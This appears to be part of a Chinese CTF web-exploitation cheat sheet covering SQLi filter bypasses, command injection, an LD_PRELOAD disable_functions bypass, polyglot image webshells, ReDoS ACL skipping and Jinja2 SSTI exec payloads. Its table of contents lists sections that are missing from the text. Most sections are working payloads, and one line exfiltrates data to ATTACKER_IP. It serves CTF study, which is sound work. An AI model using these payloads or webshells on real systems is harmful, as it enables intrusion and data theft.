# CTF Web - 服务端代码执行与访问类攻击（第二部分）

## 目录
- [SQLi 关键字碎片化绕过（SecuInside 2013）](#sqli-关键字碎片化绕过secuinside-2013)
- [经 ORDER BY CASE 绕过 SQL WHERE（Sharif CTF 2016）](#经-order-by-case-绕过-sql-wheresharif-ctf-2016)
- [经 DNS 记录注入 SQL（PlaidCTF 2014）](#经-dns-记录注入-sqlplaidctf-2014)
- [Bash 花括号展开实现无空格命令注入（Insomnihack 2016）](#bash-花括号展开实现无空格命令注入insomnihack-2016)
- [Common Lisp 经 reader macro 注入（Insomnihack 2016）](#common-lisp-经-reader-macro-注入insomnihack-2016)
- [PHP7 OPcache 二进制 webshell + LD_PRELOAD 绕过 disable_functions（ALICTF 2016）](#php7-opcache-二进制-webshell--ld_preload-绕过-disable_functionsalictf-2016)
- [Wget GET 参数文件名技巧上传 PHP shell（SECUINSIDE 2016）](#wget-get-参数文件名技巧上传-php-shellsecuinside-2016)
- [Tar 文件名命令注入（CyberSecurityRumble 2016）](#tar-文件名命令注入cybersecurityrumble-2016)
- [PNG/PHP 多语言上传 + 双扩展名 + 绕过 disable_functions（MetaCTF Flash 2026）](#pngphp-多语言上传--双扩展名--绕过-disable_functionsmetactf-flash-2026)
- [PHP BMP 像素 webshell + 文件名截断（Nuit du Hack CTF 2018）](#php-bmp-像素-webshell--文件名截断nuit-du-hack-ctf-2018)
- [编辑器备份文件源码泄露（h4ckc0n 2017）](#编辑器备份文件源码泄露h4ckc0n-2017)
- [date -f 任意文件读取（Can-CWIC 2017）](#date--f-任意文件读取can-cwic-2017)
- [Apache mod_rewrite PATH_INFO 绕过（EKOPARTY 2017）](#apache-mod_rewrite-path_info-绕过ekoparty-2017)
- [PHP ReDoS 跳过代码执行（CODE BLUE 2017）](#php-redos-跳过代码执行code-blue-2017)
- [自定义序列化器整数溢出 256→0 长度（Codegate 2018）](#自定义序列化器整数溢出-2560-长度codegate-2018)
- [通过剥离 STOP 操作码实现 Pickle 链式执行（VolgaCTF 2013）](#通过剥离-stop-操作码实现-pickle-链式执行volgactf-2013) *（占位 —— 见 [server-side-deser.md](server-side-deser.md)）*
- [Java 反序列化（ysoserial）](#java-反序列化ysoserial) *（占位 —— 见 [server-side-deser.md](server-side-deser.md)）*
- [Python Pickle 反序列化](#python-pickle-反序列化) *（占位 —— 见 [server-side-deser.md](server-side-deser.md)）*
- [条件竞争（Time-of-Check to Time-of-Use）](#条件竞争time-of-check-to-time-of-use) *（占位 —— 见 [server-side-deser.md](server-side-deser.md)）*
- [未锚定正则导致命令注入（picoCTF 2018）](#未锚定正则导致命令注入picoctf-2018)
- [Jinja2 SSTI：globals.__self__.exec() 字符串拼接绕过（InCTF 2018）](#jinja2-sstiglobals__self__exec-字符串拼接绕过inctf-2018)
- [web.py reparam() eval + 内置函数被置空时的 __subclasses__（HITCON 2018）](#webpy-reparam-eval--内置函数被置空时的-__subclasses__hitcon-2018)
- [经 redis.call() 的 Redis Lua 注入（HumanCTF 2018）](#经-rediscall-的-redis-lua-注入humanctf-2018)
- [PHP create_function 字符串插值 RCE（FireShell 2019）](#php-create_function-字符串插值-rcefireshell-2019)
- [php://input + NULL 字节 + ~位运算绕过 base64 过滤（DefCamp 2018）](#phpinput--null-字节--位运算绕过-base64-过滤defcamp-2018)
- [经 exiftool 的 EXIF ImageDescription shell 注入（OTW Advent 2018）](#经-exiftool-的-exif-imagedescription-shell-注入otw-advent-2018)
- [.phar 扩展名绕过 PHP 上传黑名单（35C3 2018）](#phar-扩展名绕过-php-上传黑名单35c3-2018)
- [vsftpd 2.3.4 笑脸后门（P.W.N. CTF 2018）](#vsftpd-234-笑脸后门pwn-ctf-2018)

注入类攻击（SQLi、SSTI、SSRF、XXE、命令注入、PHP 类型混淆、PHP 文件包含）见 [server-side.md](server-side.md)。反序列化攻击（Java、Pickle）与条件竞争见 [server-side-deser.md](server-side-deser.md)。CVE 专项利用、路径穿越绕过、Flask/Werkzeug 调试以及其他进阶技巧见 [server-side-advanced.md](server-side-advanced.md)。

*另见：[server-side-exec.md](server-side-exec.md) —— Ruby/Perl/JS 代码注入、LaTeX 注入 RCE、PHP preg_replace /e RCE、PHP 反引号执行、PHP assert() 注入、Prolog 注入、ReDoS 时间侧信道、文件上传到 RCE（.htaccess、日志投毒、Python .so 劫持、Gogs 符号链接、ZipSlip）、从 Cookie 触发 PHP 反序列化、PHP extract() 变量覆盖、XPath 盲注、API 过滤参数注入、HTTP 响应头隐藏、WebSocket 批量赋值、Thymeleaf SpEL SSTI。*

---

<a id="sqli-keyword-fragmentation-bypass-secuinside-2013"></a>
## SQLi 关键字碎片化绕过（SecuInside 2013）

**模式：** 单次执行（single-pass）的 `preg_replace()` 关键字过滤器，可把被剥除的关键字嵌进 payload 单词内部来绕过。

**关键点：** 若过滤只剥一次 `load_file`，`unload_fileon` 在剥除后就变成 `union`。内层关键字充当"牺牲片段"。

```php
// Vulnerable filter (single-pass, case-sensitive)
$str = preg_replace("/union/", "", $str);
$str = preg_replace("/select/", "", $str);
$str = preg_replace("/load_file/", "", $str);
$str = preg_replace("/ /", "", $str);
```

```sql
-- Bypass payload (spaces replaced with /**/ comments)
(0)uniunionon/**/selselectect/**/1,2,3/**/frfromom/**/users
-- Or nest the stripped keyword:
unload_fileon/**/selectload_filect/**/flag/**/frload_fileom/**/secrets
```

**变体：** 大小写敏感过滤：混用大小写（`unIoN`）。空格过滤：`/**/`、`%09`、`%0a`。递归过滤：把关键字写两遍（`ununionion`）。务必先测出过滤是单次还是递归。

---

<a id="sql-where-bypass-via-order-by-case-sharif-ctf-2016"></a>
## 经 ORDER BY CASE 绕过 SQL WHERE（Sharif CTF 2016）

当 `WHERE` 子句限制使你无法直接过滤时，用 `ORDER BY CASE` 控制结果排序来提取数据：

```sql
SELECT * FROM messages ORDER BY (CASE WHEN msg LIKE '%flag%' THEN 1 ELSE 0 END) DESC
```

**关键点：** 即便无法使用 WHERE，带条件表达式的 ORDER BY 也能把目标行排到结果最前面。配合 `LIMIT 1` 可精确锁定单条记录。

---

<a id="sql-injection-via-dns-records-plaidctf-2014"></a>
## 经 DNS 记录注入 SQL（PlaidCTF 2014）

**模式：** 应用对用户可控 IP 调用 `gethostbyaddr()` 或 `dns_get_record()`，并把结果未经转义地拼进 SQL。通过自己可控的 DNS PTR 或 TXT 记录注入 SQL。

**攻击准备：**
1. 把你 IP 的 PTR 记录指向自己控制的域名（如 `evil.example.com`）
2. 在该域名下添加一条含 SQL payload 的 TXT 记录
3. 触发应用解析你的 IP（如走密码重置流程）

```php
// Vulnerable code:
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$details = dns_get_record($hostname);
mysql_query("UPDATE users SET resetinfo='$details' WHERE ...");
// TXT record: "' UNION SELECT flag FROM flags-- "
```

**关键点：** DNS 记录（PTR、TXT、MX）是一条常被忽视的注入通道。任何解析 IP/主机名并把结果并入数据库查询的应用都存在风险。控制权来自为自有域名配置 DNS 记录，或设置 IP 的反向 DNS。

---

<a id="bash-brace-expansion-for-space-free-command-injection-insomnihack-2016"></a>
## Bash 花括号展开实现无空格命令注入（Insomnihack 2016）

当空格和常见 shell 元字符（`$`、`&`、`\`、`;`、`|`、`*`）都被过滤时，用 bash 花括号展开与进程替换：

```bash
# Brace expansion inserts spaces: {cmd,-flag,arg} expands to: cmd -flag arg
{ls,-la,../..}

# Exfiltrate via UDP when outbound TCP is blocked:
<({ls,-la,../..}>/dev/udp/ATTACKER_IP/53)

# Execute base64-encoded payload:
<({base64,-d,ENCODED_PAYLOAD}>/tmp/s.sh)
```

**关键点：** bash 花括号展开 `{a,b,c}` 会拆成以空格分隔的 token，完全不需要字面空格。配合 `/dev/udp/` 或 `/dev/tcp/` 做外带，可绕过拦截空格和大多数 shell 元字符的过滤器。

---

<a id="common-lisp-injection-via-reader-macro-insomnihack-2016"></a>
## Common Lisp 经 reader macro 注入（Insomnihack 2016）

Lisp 的 `read` 函数在解析阶段就会对 `#.(expression)` reader macro 求值。当应用用 `read`（而非 `read-line`）处理用户输入时，即可任意代码执行：

```lisp
#.(ext:run-program "cat" :arguments '("/flag"))
#.(run-shell-command "cat /flag")
```

**关键点：** Lisp 的 `read` 在设计上就把数据当代码 —— `#.()` reader macro 会在解析期对任意表达式求值。这相当于 Lisp 版的 SQL 注入。安全做法：字符串输入用 `read-line`，永远不要对不可信数据用 `read`。

---

<a id="pickle-chaining-via-stop-opcode-stripping-volgactf-2013"></a>
## 通过剥离 STOP 操作码实现 Pickle 链式执行（VolgaCTF 2013）

从第一个 payload 中剥掉 pickle 的 STOP 操作码（`\x2e`）后拼接第二个 payload —— 两段 `__reduce__` 会在单次 `pickle.loads()` 中执行。用 `os.dup2()` 把输出接回 socket。完整利用代码见 [server-side-deser.md](server-side-deser.md#通过剥离-stop-操作码实现-pickle-链式执行volgactf-2013)。

---

<a id="java-deserialization-ysoserial"></a>
## Java 反序列化（ysoserial）

Cookie/POST 中出现序列化 Java 对象（以 `rO0AB` / `aced0005` 开头）。用 ysoserial gadget 链（CommonsCollections；盲测用 URLDNS）。payload 与绕过技巧见 [server-side-deser.md](server-side-deser.md#java-反序列化ysoserial)。

---

<a id="python-pickle-deserialization"></a>
## Python Pickle 反序列化

`pickle.loads()` 会调用 `__reduce__()`，用 `(os.system, ('cmd',))` 即可立即 RCE。常见于 Flask session、ML 模型文件、Redis 对象。payload 与受限 unpickler 绕过见 [server-side-deser.md](server-side-deser.md#python-pickle-反序列化)。

---

<a id="race-conditions-time-of-check-to-time-of-use"></a>
## 条件竞争（Time-of-Check to Time-of-Use）

并发请求可击穿"先检查后操作"模式（余额、优惠券、注册唯一性）。并发发送 50+ 个请求，让它们都读到修改前状态。异步利用代码与检测模式见 [server-side-deser.md](server-side-deser.md#条件竞争time-of-check-to-time-of-use)。

---

---

<a id="php7-opcache-binary-webshell--ld_preload-disable_functions-bypass-alictf-2016"></a>
## PHP7 OPcache 二进制 webshell + LD_PRELOAD 绕过 disable_functions（ALICTF 2016）

**模式（Homework）：** 多阶段链：SQLi 写文件 + PHP7 OPcache 投毒 + `LD_PRELOAD` 绕过 `disable_functions`。

**阶段 1 —— OPcache 投毒：**
开启 `opcache.file_cache` 的 PHP7 会把编译后的字节码存到 `/tmp/OPcache/[system_id]/[webroot]/script.php.bin`。通过 SQLi 的 `INTO DUMPFILE` 替换该 `.bin` 文件，即便上传受限也能执行任意 PHP。

```bash
# 1. Calculate system_id from phpinfo() data
python3 system_id_scraper.py http://target/phpinfo.php
# Output: 39b005ad77428c42788140c6839e6201

# 2. Generate opcode cache locally (match PHP version)
php -d opcache.enable_cli=1 -d opcache.file_cache=/tmp/OPcache \
    -d opcache.file_cache_only=1 -f payload.php

# 3. Patch system_id in binary (bytes 9-40)
# 4. Upload via SQLi INTO DUMPFILE:
```
```sql
-1 UNION SELECT X'<hex_of_payload.php.bin>'
INTO DUMPFILE '/tmp/OPcache/39b005ad77428c42788140c6839e6201/var/www/html/upload/evil.php.bin' #
```

**阶段 2 —— LD_PRELOAD 绕过：**
当 `disable_functions` 封死所有 exec 类函数时，用 `putenv()` + `mail()` 执行代码。PHP 的 `mail()` 会调用外部 sendmail，而 sendmail 遵循 `LD_PRELOAD`。

```c
/* evil.c — compile: gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(char *cmd) {
    char buf[512];
    snprintf(buf, sizeof(buf), "%s > /tmp/_output.txt", cmd);
    system(buf);
}

int geteuid() {
    if (getenv("LD_PRELOAD") == NULL) return 0;
    unsetenv("LD_PRELOAD");
    char *cmd = getenv("_evilcmd");
    if (cmd) payload(cmd);
    return 1;
}
```

```php
<?php
// payload.php — upload evil.so via webapp, deploy this via OPcache
putenv("LD_PRELOAD=/var/www/html/upload/evil.so");
putenv("_evilcmd=" . $_GET['cmd']);
mail("x@x.x", "", "", "");
show_source("/tmp/_output.txt");
?>
```

**关键点：** PHP 的 `disable_functions` 只限制 PHP 层调用。由 `mail()` 拉起的外部程序不受 PHP 限制，而 `LD_PRELOAD` 可覆盖这些外部程序里任意 libc 函数。OPcache 的 `.bin` 文件除了 `system_id` 匹配外没有完整性校验 —— 替换成精心构造的二进制即可任意执行 PHP，哪怕上传校验会剥掉 PHP 内容。

---

<a id="wget-get-parameter-filename-trick-for-php-shell-upload-secuinside-2016"></a>
## Wget GET 参数文件名技巧上传 PHP shell（SECUINSIDE 2016）

**模式（trendyweb）：** 服务用 `wget` 下载用户提供的 URL，并用 `parse_url()` 校验路径。wget 保存文件时会把 GET 参数保留在文件名里，从而绕过 `.php` 扩展名限制。

```text
URL: http://attacker.com/avatar.png?shell.php
parse_url($url)['path'] = '/avatar.png'      # passes .png check
wget saves as: avatar.png?shell.php           # server treats as PHP
```

通过 URL 编码的 `?` 访问：`http://target/data/hash/avatar.png%3fshell.php?cmd=id`

**关键点：** 不指定 `-O` 时，`wget` 会把 GET 参数保留在输出文件名中。`parse_url()` 把路径与查询串分开，校验只能看到路径部分的扩展名。最终文件名从查询串部分获得 `.php` 扩展名，Apache/nginx 会按 PHP 解析。

---

<a id="tar-filename-command-injection-cybersecurityrumble-2016"></a>
## Tar 文件名命令注入（CyberSecurityRumble 2016）

**模式（Jobs）：** 服务解压 tar 包，并通过 `.cgi` 脚本展示文件名。含 shell 元字符的文件名未经清洗就传给了 shell。

```bash
# Create tar with command injection filename
mkdir exploit && cd exploit
touch 'name; cat /flag #'
tar cf exploit.tar *
# Upload — server runs: echo "name; cat /flag #" in CGI context
```

**关键点：** 服务端脚本通过 shell 命令处理用户上传压缩包（tar、zip）里的文件名时，文件名中的特殊字符就是注入点。分号跳出文件名上下文，`#` 注释掉尾部字符。把不可信压缩包的文件名交给 shell 之前一定要清洗。

---

<a id="pngphp-polyglot-upload--double-extension--disable_functions-bypass-metactf-flash-2026"></a>
## PNG/PHP 多语言上传 + 双扩展名 + 绕过 disable_functions（MetaCTF Flash 2026）

**模式（Brand Kit）：** 上传过滤器拒绝 `.php` 但接受图片。nginx/PHP-FPM 只要文件名以 `.php` 结尾就会执行，不管前面有多少扩展名。`disable_functions` 封了所有命令执行函数，但文件系统函数仍可用。

**第 1 步：构造 PNG/PHP 多语言文件**
```bash
# Create a valid PNG that also contains PHP code after the IEND chunk
# PHP interpreter ignores binary data before <?php
cp valid_image.png polyglot.png.php

# Append PHP payload after the PNG IEND marker
cat >> polyglot.png.php << 'PAYLOAD'
<?php
// disable_functions blocks system/exec/passthru/shell_exec/popen/proc_open
// Use filesystem functions instead
$files = scandir('/');
foreach ($files as $f) {
    if (strpos($f, 'flag') !== false || strpos($f, 'ctf') !== false) {
        echo "FOUND: $f\n";
        echo file_get_contents("/$f");
    }
}
// Fallback: list everything
echo "\n--- Full listing ---\n";
print_r($files);
?>
PAYLOAD
```

**第 2 步：用双扩展名上传**
```bash
# Filter checks extension — .png.php has .php at the end
# Some filters only check first extension (.png) or reject exact match on .php
curl -F 'file=@polyglot.png.php;type=image/png' http://target/upload

# Alternative double extensions to try:
# .png.php    .jpg.php    .gif.php
# .png.phtml  .png.phar   .png.php5
# .php.png (some filters check last extension, nginx checks .php anywhere)
```

**第 3 步：访问并枚举**
```bash
# The uploaded file is served by nginx which passes .php to PHP-FPM
curl http://target/uploads/polyglot.png.php

# If flag filename is randomized, first enumerate:
# scandir('/') reveals: flag_a8f3c9d2e1.txt
# Then read it with file_get_contents()
```

**`disable_functions` 封了执行能力时好用的 PHP 函数：**
```php
<?php
// File discovery
scandir('/');                          // List directory
glob('/flag*');                        // Glob pattern match
file_exists('/flag.txt');              // Check existence

// File reading
file_get_contents('/flag.txt');        // Read entire file
readfile('/flag.txt');                 // Output file directly
file('/flag.txt');                     // Read as array of lines
fopen('/flag.txt', 'r');              // Stream-based read

// Environment / info leaking
phpinfo();                             // Full PHP config, env vars
getenv('FLAG');                        // Environment variable
get_defined_vars();                    // All variables in scope

// If open_basedir is set, check what's allowed:
ini_get('open_basedir');
ini_get('disable_functions');
?>
```

**关键点：** 三层配合：(1) PNG/PHP 多语言文件以合法 PNG 魔数开头，能通过图片校验；(2) 双扩展名 `.png.php` 绕过拒绝 `.php` 的过滤器，同时又命中 nginx 匹配 `\.php$` 的 location 正则；(3) `disable_functions` 封死命令执行时，`scandir()` + `file_get_contents()` 仍可用于目录列举和读文件。遇到 `disable_functions` 先枚举文件系统 —— flag 文件名往往是随机的。

**识别时机：** 仅允许图片的文件上传题。查看 `phpinfo()` 输出里的 `disable_functions` 列表。若所有 exec 函数被封，转向纯 PHP 文件系统函数。

**参考：** MetaCTF Flash CTF 2026 "Brand Kit"

---

<a id="php-bmp-pixel-webshell-with-filename-truncation-nuit-du-hack-ctf-2018"></a>
### PHP BMP 像素 webshell + 文件名截断（Nuit du Hack CTF 2018）

**模式：** 把 PHP 代码编码成 BMP 像素颜色（BGR 格式）。服务校验扩展名（如必须 `.JPG` 或 `.BMP`），但会把文件名截断到最大长度。构造 `'A'*46 + '.php.JPG'` 这样的文件名：先通过 `.JPG` 扩展名校验，再在 50 字符限制处被截成 `'A'*46 + '.php'`。

**BMP 像素编码原理：**
```python
import struct
import requests

# BMP files store pixel data as raw bytes in BGR order (Blue, Green, Red)
# PHP ignores non-PHP content before <?php tags
# So embedding PHP code in pixel color values creates a valid BMP that is also valid PHP

payload = "<?php @$_GET[a]($_GET[b]);?>"

def pad(s, block=3):
    """Pad payload to multiple of 3 bytes (one pixel = 3 color bytes)."""
    while len(s) % block != 0:
        s += " "
    return s

def chunk(s, n):
    """Split string into n-byte chunks."""
    return [s[i:i+n] for i in range(0, len(s), n)]

# Read a template BMP file (small valid BMP, e.g., 10x10)
with open("template.bmp", "rb") as f:
    data = bytearray(f.read())

# Find the pixel data offset (stored at byte 10-13 in BMP header)
pixel_offset = struct.unpack_from('<I', data, 10)[0]

# Encode PHP payload as BMP pixel colors
padded = pad(payload)
index = pixel_offset
for c in chunk(padded, 3):
    data[index] = ord(c[0])  # keep payload byte order so <?php survives as one run
    data[index + 1] = ord(c[1])
    data[index + 2] = ord(c[2])
    index += 3  # 24-bit BMP: 3 bytes per pixel, no padding byte
assert payload.encode() in bytes(data)  # payload must survive as one contiguous run

# Filename truncation exploit:
# Server checks extension: must end with .JPG or .BMP
# Server truncates filename to 50 chars
# "A" * 46 + ".php" = 50 chars (after truncation)
# "A" * 46 + ".php" + ".JPG" = 54 chars (passes extension check before truncation)
name = "A" * 46 + ".php"

# Upload with the extension that passes validation
requests.post(
    "http://target/upload",
    data={"data": str(list(data)), "name": name + ".JPG", "format": "BMP"}
)

# Access the webshell (filename truncated to .php)
r = requests.get(f"http://target/uploads/{name}", params={"a": "system", "b": "cat /flag.txt"})
print(r.text)
```

**文件名截断变体：**
```text
# 50-char limit example:
"A"*46 + ".php" + ".JPG"     -> truncated to "A"*46 + ".php"  (50 chars)
"A"*46 + ".php" + ".png"     -> truncated to "A"*46 + ".php"  (50 chars)

# Other truncation lengths — adjust padding:
# For N-char limit: "A"*(N-4) + ".php" + ".ext"
# The ".ext" passes the extension check, then gets truncated away
```

**关键点：** BMP 以 BGR 顺序把像素存为原始字节，PHP 会忽略 `<?php` 之前的非 PHP 内容。服务端把文件名截断到固定长度时，`'A'*46 + '.php' + '.JPG'` 能通过扩展名校验却保存为 `.php`。这组合了三种绕过：(1) 多语言文件格式（合法 BMP + 合法 PHP）；(2) 靠文件名截断规避扩展名检查；(3) webshell 藏在像素数据里，除非服务端完全重绘图片，否则重编码不会破坏它。

---

<a id="editor-backup-file-source-disclosure-h4ckc0n-2017"></a>
## 编辑器备份文件源码泄露（h4ckc0n 2017）

**模式：** 文本编辑器保存时会在原文件旁留下备份文件。这些文件常被遗留在 Web 服务器上并以纯文本形式返回，从而在执行前泄露 PHP 源码。

| 编辑器 | 备份文件名模式 |
|--------|---------------|
| gedit  | `file~` |
| vim    | `.file.swp`（还有 `.file.swn`、`.file.swo`） |
| nano   | `file~` |
| emacs  | `file~` 和 `#file#` |

```bash
# Check common backup variants for a target file
TARGET="http://target/checker.php"
for suffix in "~" ".swp" ".bak" ".orig"; do
    curl -s -o /dev/null -w "%{http_code} $TARGET$suffix\n" "$TARGET$suffix"
done
# vim hidden-file backup:
curl -s "http://target/.checker.php.swp"
# emacs auto-save:
curl -s "http://target/#checker.php#"
```

```bash
# Practical: grab vim swap file and recover source
curl -o checker.swp "http://target/.checker.php.swp"
vim -r checker.swp          # opens recovered file in vim
# Or: strings checker.swp   # quick content extraction
```

**关键点：** 找源码泄露时始终检查 `filename~`、`.filename.swp`、`#filename#` 这几种变体。结合目录列举，或从 JS/HTML 注释里收集到的已知文件名来枚举候选。

---

<a id="date--f-arbitrary-file-read-can-cwic-2017"></a>
## date -f 任意文件读取（Can-CWIC 2017）

**模式：** GNU `date` 命令的 `-f`/`--file` 会逐行读取文件并当作日期格式串处理。当用户可控输入作为参数进入 `date` 调用时，即可任意读文件。

```bash
# Normal behavior: date -f /etc/passwd reads each line as a date string
# Lines that aren't valid dates print an error message containing the line content
date -f /etc/passwd
# Output includes: date: invalid date 'root:x:0:0:root:/root:/bin/bash'
# → file contents leak through error messages
```

```python
import subprocess

# Simulate: if web app passes user arg to date command
# e.g., os.system(f"date -d '{user_input}'") where user controls the flag value
# Or: user_input = "-f /etc/passwd" injected into arguments

# Brute-force readable files
targets = ['/etc/passwd', '/flag', '/flag.txt', '/home/ctf/flag']
for t in targets:
    result = subprocess.run(['date', '-f', t], capture_output=True, text=True)
    print(result.stderr)  # errors contain file content
```

```bash
# When command injection is available and date is accessible:
curl "http://target/cgi-bin/app.cgi" --data "cmd=date+-f+/flag.txt"
# Response error output reveals flag content
```

**关键点：** 只要 `date` 命令带有用户可控参数，`date --file` / `date -f` 就能任意读文件。报错信息会带上无法识别的行内容，从而逐行泄露文件。任何装了 GNU coreutils `date` 的系统都适用。

---

<a id="apache-mod_rewrite-path_info-bypass-ekoparty-2017"></a>
## Apache mod_rewrite PATH_INFO 绕过（EKOPARTY 2017）

**模式：** Apache mod_rewrite 规则用正则匹配请求路径。访问 `/index.php/getflag` 会先命中针对 `/index.php` 的宽松规则（让该 PHP 文件处理请求），从而在针对 `/getflag` 的限制规则生效前就被处理。PHP 会以 `PATH_INFO` 形式收到 `/getflag`。

```apache
# Vulnerable .htaccess / rewrite rules:
RewriteRule ^index\.php$ index.php [L]          # allows access to index.php
RewriteRule ^getflag$    /forbidden.html [R,L]  # blocks /getflag directly
```

```bash
# Direct access — blocked by second rule:
curl http://target/getflag          # → 403 or redirect to forbidden.html

# PATH_INFO bypass — matches first rule, PHP gets PATH_INFO=/getflag:
curl http://target/index.php/getflag   # → executes index.php with PATH_INFO=/getflag
```

```php
// In index.php — reads PATH_INFO to dispatch
$action = $_SERVER['PATH_INFO'];   // "/getflag"
if ($action === '/getflag') {
    echo $flag;
}
```

**规则顺序很关键：** Apache 自上而下求值 RewriteRules，遇到第一个命中的 `[L]` 就停止。针对 PHP 文件的宽松规则会在后缀路径的限制规则之前捕获 `/index.php/anything`。

**关键点：** mod_rewrite 规则顺序与 PHP PATH_INFO 的交互：`/index.php/protected-path` 先命中 PHP 文件规则，从而绕过访问控制。PHP 的 `$_SERVER['PATH_INFO']` 收到后缀，应用自身的路由就会把请求分发给受保护的处理逻辑。

---

<a id="php-redos-to-skip-code-execution-code-blue-2017"></a>
## PHP ReDoS 跳过代码执行（CODE BLUE 2017）

**模式：** PHP 的 `preg_match()` 是同步的。当复杂度为灾难性回溯的正则匹配用户可控输入时，PCRE 引擎超时，`preg_match()` 返回 `false`。正则检查之后的代码（比如向 ACL 表 INSERT）就不会执行。缺失 ACL 记录，后果等同于没有任何访问限制 —— 或者等同于最宽松的默认值。

```php
// Vulnerable pattern: regex check followed by ACL insert
if (preg_match('/^(ADMIN-+)+$/', $role)) {
    // If this times out (returns false), the block is never entered
    // AND code after the if-block may also be skipped or behave differently
}
// ACL INSERT that only runs on successful match:
$db->query("INSERT INTO acl (user, role) VALUES (?, ?)", [$user, 'ADMIN']);
// Missing ACL row = no restriction applied
```

```python
import requests

# Payload: trigger catastrophic backtracking on the regex (ADMIN-+)+
# The nested quantifier causes exponential backtracking with enough repetitions
redos_payload = 'ADMIN-' + '-' * 50 + '!'   # trailing ! forces full backtrack
# Or the classic: ADMIN--(###A)*  structure repeated

r = requests.post('http://target/register', data={
    'username': 'victim',
    'role': redos_payload
})
# If the ACL INSERT is skipped, the user now has no restriction on their account
```

**触发回溯的 payload 模式：**
```text
ADMIN--(###A)*  repeated 20+ times
(ADMIN-+)+X     where X doesn't match, forcing full backtrack
```

**关键点：** PHP ReDoS 可以让后续代码完全不执行 —— 超时的 `preg_match()` 返回 `false`（而非 `0`），所有以该检查为前置条件的代码（如 ACL 表 INSERT）被静默跳过。这不只是 DoS：当缺失的副作用会改变应用安全状态时，它就是一种代码执行绕过。

---

<a id="custom-serializer-integer-overflow-256-to-0-length-codegate-2018"></a>
## 自定义序列化器整数溢出 256→0 长度（Codegate 2018）

**模式：** 一个自定义的 PHP 文件型数据库按 `<type_byte><length_byte><data>` 的格式逐字段存储记录。长度用单字节表示（`chr(len)`）。当字段值恰好 256 字节时，`chr(256)` 回绕成 `\x00`（空字节），解析器就把长度当作 0。于是剩余 256 字节数据溢出到后续字段边界，攻击者得以覆盖密码哈希或权限等级等字段。

```python
import hashlib
import requests

# Custom DB format per field: \x01 (string type) + chr(length) + data
# Fields stored in order: email, ip, level
# Goal: overwrite the password hash and level fields by overflowing email

# Craft the payload to inject into the "email" field
target_password = "hacked"
pw_hash = hashlib.md5(target_password.encode()).hexdigest()  # 32 hex chars

# These are the fields we want to inject after the overflow
injected_mail = '\x01\x20' + pw_hash          # type=string, len=32, data=md5(pw)
injected_level = '\x01\x01' + '2'             # type=string, len=1, data='2' (admin)

# Calculate padding to make total email field exactly 256 bytes
overhead = len(injected_mail) + len(injected_level) + 2  # +2 for the ip field header
pad_len = 256 - overhead
injected_ip = '\x01' + chr(pad_len) + 'A' * pad_len  # type=string, padded ip field

# Combine: mail_data + ip_data + level_data = 256 bytes total
# When stored as email field: chr(256) = chr(0) = \x00 → length = 0
# Parser reads 0 bytes for email, then the 256 bytes become the next fields
payload_email = injected_mail + injected_ip + injected_level

# Register with the overflow payload as the email
r = requests.post("http://target/register", data={
    "email": payload_email,
    "password": target_password,
    "username": "attacker"
})
print(r.text)
```

```text
# How the overflow works in the file-based DB:

# Normal record layout:
# [email_type][email_len][email_data][ip_type][ip_len][ip_data][level_type][level_len][level_data]
#   \x01       \x10       user@x.com   \x01    \x09   127.0.0.1  \x01       \x01       1

# Overflow: email is 256 bytes → chr(256) = \x00
# [email_type][0x00][...256 bytes of attacker data...]
#   \x01       \x00  ← parser reads 0 bytes for email
#                    ← the 256 bytes are now parsed as ip, level, etc.
#                    ← attacker controls password hash and level fields
```

```python
# Generalized overflow finder for custom serialization formats
def find_overflow_length(field_width_bytes):
    """
    Calculate the overflow value for N-byte length fields.
    1 byte: overflows at 256 → 0
    2 bytes: overflows at 65536 → 0
    """
    return 2 ** (8 * field_width_bytes)

# 1-byte length: 256 → 0
assert find_overflow_length(1) == 256
# 2-byte length: 65536 → 0
assert find_overflow_length(2) == 65536
```

**关键点：** 单字节长度字段在 256 处溢出为 0，使一个字段的数据溢出到后续字段。任何使用定宽长度字段的自定义序列化格式都有此问题。留意长度存于 1 字节（上限 255）或 2 字节（上限 65535）的格式。自定义序列化的迹象：二进制文件型数据库、自定义 session 格式、私有协议解析器。攻击需要知道（或猜到）序列化结构中的字段顺序与格式。标准反序列化攻击另见 [server-side-deser.md](server-side-deser.md)。

---

<a id="unanchored-regex-command-injection-picoctf-2018"></a>
## 未锚定正则导致命令注入（picoCTF 2018）

**模式：** 输入校验用 `preg_match('/^<ip-pattern>/i', $ip)` —— 漏了结尾的 `$` 锚点。只要字符串*以*合法 IP 开头，匹配就成功，于是攻击者在后面追加分号和 shell 命令，仍能走到后面的 `exec("ping $ip")`。

```php
// Vulnerable
if (preg_match('/^(\d{1,3}\.){3}\d{1,3}/', $_GET['ip'])) {
    exec("ping -c 1 " . $_GET['ip']);
}
```

```bash
curl "http://target/ping.php?ip=1.1.1.1;cat%20/flag.txt"
# matches ^1.1.1.1 then executes: ping -c 1 1.1.1.1;cat /flag.txt
```

**关键点：** 只有 `^pattern` 没有 `$` 时，只固定了前缀、没固定后缀。任何输入校验正则都必须两端锚定，或改用 `preg_match('/\A...\z/')`。审计时 grep `preg_match('/\^`，并确认每处命中都带了 `\$/` 或 `\z/`。同类缺陷也出现在 JavaScript 的 `String.match` 和 Python 的 `re.match`（后者隐式左锚定，但右端不锚定）。

**参考：** picoCTF 2018 — Fancy Alive Monitoring，writeups 11706、11721、11761

---

<a id="jinja2-ssti-via-globals__self__exec-string-concat-bypass-inctf-2018"></a>
## Jinja2 SSTI：globals.__self__.exec() 字符串拼接绕过（InCTF 2018）

**模式：** 模板过滤器拦截 `__class__`、`os`、`import`、`eval`、`subprocess` 等若干字面量。从任意已绑定的 Jinja 变量走到 `globals.__self__`（Python builtins 模块），再对一段在运行时用字符串拼接重建禁用子串的 payload 调用 `exec`。

```text
{{ globals.__self__.exec("imp" + "ort o" + "s;o" + "s.system('cat /flag')") }}

# Alternative via any Python object already in context:
{{ request.__class__.__init__.__globals__.__builtins__.exec(
    "__imp"+"ort__('o'+'s').system('id')"
) }}
```

**关键点：** Jinja 作用域里的任何函数对象都暴露 `__globals__`（并由此可达真正的 `builtins`）。即便 `os`、`import`、`__class__` 被拉黑，字符串拼接与 `chr(...)` 这类技巧可把禁用词拆到多个字面量段中，渲染前的过滤器永远看不到它们拼在一起。加固方案：用 `jinja2.sandbox.SandboxedEnvironment`，而不是字符串黑名单。

